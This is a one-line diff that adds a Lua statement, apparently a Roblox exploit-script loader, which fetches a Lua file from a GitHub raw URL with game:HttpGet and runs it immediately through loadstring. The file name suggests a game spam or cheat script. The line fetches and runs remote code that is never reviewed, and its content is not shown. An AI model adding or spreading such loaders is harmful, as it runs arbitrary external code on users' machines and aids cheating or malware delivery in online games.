@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/rainy-valley-spam5-dus6n1k6ifbz1a.lua"))()
